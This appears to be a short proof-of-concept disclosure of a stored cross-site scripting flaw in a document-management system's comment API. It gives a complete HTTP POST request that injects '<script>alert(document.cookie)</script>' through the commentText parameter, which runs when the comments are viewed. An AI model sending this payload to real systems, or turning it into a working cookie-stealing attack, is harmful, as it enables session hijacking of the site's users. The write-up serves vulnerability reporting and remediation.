# xss-s-1

Send a post to `/ecm/api/rest/ecm/sociableDocument/documentComment/`. You need changed the value of `documentId` with document id and `commentText` with your payload. The vulnerable parameter is `commentText`. In this case, there is no specific endpoint to view the Stored XSS, it can be triggered simply by opening any part of the document's comments section.

```
POST /ecm/api/rest/ecm/sociableDocument/documentComment/ HTTP/2
Host: host.com
Cookie: JSESSIONID=session; JSESSIONIDSSO=sessionSSO
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 93

{"documentId":DOCUMENT_ID,"version":1000,"commentText":"<script>alert(document.cookie)</script>"}
```
